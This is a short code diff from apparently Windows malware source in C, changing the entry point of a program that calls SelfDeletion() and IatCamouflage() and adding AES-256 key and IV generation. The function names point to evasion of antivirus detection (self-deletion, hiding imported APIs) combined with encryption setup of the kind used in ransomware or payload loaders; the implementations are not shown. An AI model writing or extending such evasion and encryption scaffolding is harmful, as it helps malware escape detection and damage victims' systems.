@@ -100,9 +100,15 @@ BOOL SelfDeletion() {
 
 }
 
-int WINAPI WinMain() {
+int main() {
 		SelfDeletion();
 		IatCamouflage();
-		GoodFunction();
+		InitializeModules();
+
+		//GoodFunction();
+		uint8_t keyValue[AES_256_KEY_SIZE];
+		uint8_t iv[IV_SIZE];
+		GenerateKey(keyValue,iv);
+	getchar();
 	return 0;
 }
